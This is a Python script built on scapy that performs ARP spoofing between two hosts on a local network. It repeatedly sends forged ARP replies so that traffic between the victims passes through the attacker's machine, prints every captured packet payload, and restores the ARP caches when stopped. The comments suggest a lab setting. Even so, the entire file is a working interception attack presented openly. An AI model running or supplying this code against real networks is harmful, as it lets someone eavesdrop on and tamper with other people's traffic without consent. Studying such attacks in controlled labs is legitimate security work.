"""
ARP spoofing - attack inside a local network where an attacker lies to a victim about which MAC addresses belong to which IPs
Usage:
    python3 spoof_arp.py <ip1> <ip2>
Poisons the ARP caches of both hosts so traffic between them is captured by the attacker.
Prints each captured packet.
Restores the caches on Ctrl+C.

Note: You may also occasionally see "echo replies" in the output, carrying the other host's payload,
e.g. host2 -> host1 with payload "Hello". I believe those are because spoofing is imperfect: at startup,
the two poison() calls run sequentially so one likely manages to send before; between poisoning rounds,
every SPOOF_INTERVAL seconds, entries can momentarily revert. In those windows, a request can slip through to
the real target, whose kernel auto-replies echoing the same payload back, which we log as well.
"""

from scapy.layers.l2 import ARP, Ether
from scapy.all import *
import sys
import time
import threading

INTERFACE = "eth0"
# seconds between re-poisoning rounds, frequent enough to keep the cache hot, yet not flood
SPOOF_INTERVAL = 2
# seconds between corrective replies during cleanup
RESTORE_GAP = 0.2
# how many corrective replies to send on cleanup to ensure reliability (packets might get lost)
RESTORE_ROUNDS = 5

def get_mac(ip: str) -> str:
    """Get the MAC address of 'ip' with a broadcast ARP who-has"""
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=INTERFACE, verbose=False,
    )
    for _, reply in answered:
        return reply[Ether].src

    raise RuntimeError(f"No MAC address found for {ip}")

def poison(target_ip, target_mac, spoofed_ip, attacker_mac):
    """Tell 'target_ip' that 'spoofed_ip' is at 'attacker_mac'."""
    sendp(Ether(dst=target_mac) /
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=attacker_mac),
        iface=INTERFACE, verbose=False)

def spoof_loop(ip1, mac1, ip2, mac2, attacker_mac, stop_event):
    """Runs in a background thread, lying each round about the other host's MAC."""
    while not stop_event.is_set():
        poison(ip1, mac1, ip2, attacker_mac)
        poison(ip2, mac2, ip1, attacker_mac)
        stop_event.wait(SPOOF_INTERVAL)

def restore(ip1, mac1, ip2, mac2):
    """Same shape as above, but with the real MACs. RESTORE_ROUNDS tries."""
    for _ in range(RESTORE_ROUNDS):
        sendp(Ether(dst=mac1) /
            ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2),
            iface=INTERFACE, verbose=False)
        sendp(Ether(dst=mac2) /
            ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1),
            iface=INTERFACE, verbose=False)
        time.sleep(RESTORE_GAP)

def make_printer(ip1, ip2):
    endpoints = {ip1, ip2}
    def _print(pkt):
        if not pkt.haslayer("IP"):
            return
        src, dst = pkt['IP'].src, pkt['IP'].dst
        if {src, dst} != endpoints:
            return
        # The payload is pulled off the 'Raw' layer if there is one (nping's --data-string becomes a 'Raw' layer)
        # otherwise fall back to the bytes of the last layer for ICMP packets without payload data.
        payload = pkt[Raw].load if pkt.haslayer(Raw) else bytes(pkt.lastlayer())
        print(f"Received traffic from {src} to {dst}: {payload}")
    return _print

def main():
    if len(sys.argv) != 3:
        print("[ERROR] Usage: python3 spoof_arp.py <ip1> <ip2>")
        sys.exit(1)

    ip1, ip2 = sys.argv[1], sys.argv[2]

    # scapy's global config object, we set the default network interface it uses
    conf.iface = INTERFACE
    attacker_mac = get_if_hwaddr(INTERFACE)

    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)
    print(f"[INFO] {ip1}'s MAC address: {mac1}")
    print(f"[INFO] {ip2}'s MAC address: {mac2}")
    print(f"[INFO] Attacker MAC address: {attacker_mac}")

    stop_event = threading.Event()
    # daemon=True, if the main thread dies, the spoofer dies as well
    spoofer = threading.Thread(
        target=spoof_loop,
        args=(ip1, mac1, ip2, mac2, attacker_mac, stop_event),
        daemon=True,
    )
    spoofer.start()
    print("[INFO] Spoofing started. Ctrl+C to stop and restore.")

    try:
        # blocks the main thread, calling the printer on every IPv4 frame between the victims
        # BPF filter syntax - drops non-matching packets - matches only IPv4 frames where both ip1 and ip2 appear as endpoints)
        sniff(
            iface=INTERFACE,
            filter=f"ip host {ip1} and ip host {ip2}",
            prn=make_printer(ip1, ip2),
            store=False
        )
    except KeyboardInterrupt:
        pass
    finally:
        print("[INFO] Restoring ARP tables...")
        stop_event.set()
        spoofer.join(timeout=SPOOF_INTERVAL + 1)
        restore(ip1, mac1, ip2, mac2)
        print("[INFO] ARP tables restored.")

if __name__ == "__main__":
    main()
